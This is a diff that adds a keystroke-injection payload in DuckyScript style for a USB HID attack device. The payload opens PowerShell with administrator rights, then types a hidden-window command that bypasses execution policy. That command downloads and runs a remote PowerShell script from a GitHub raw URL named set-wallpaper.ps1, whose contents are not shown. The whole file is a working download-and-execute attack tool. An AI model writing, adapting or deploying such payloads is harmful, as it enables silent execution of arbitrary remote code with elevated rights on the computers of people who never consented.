@@ -1,0 +1,17 @@
+ATTACKMODE HID
+DELAY 2000
+REM Open the Run dialog
+GUI r
+DELAY 50
+STRING powershell
+DELAY 50
+CTRL SHIFT ENTER 
+DELAY 300
+STRING Start-Process powershell -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command iex(iwr 'https://raw.githubusercontent.com/killcode403/Main/refs/heads/main/Powershell/set-wallpaper.ps1' -UseBasicParsing)"
+DELAY 100
+ENTER
+DELAY 50
+STRING exit
+DELAY 50
+ENTER
+
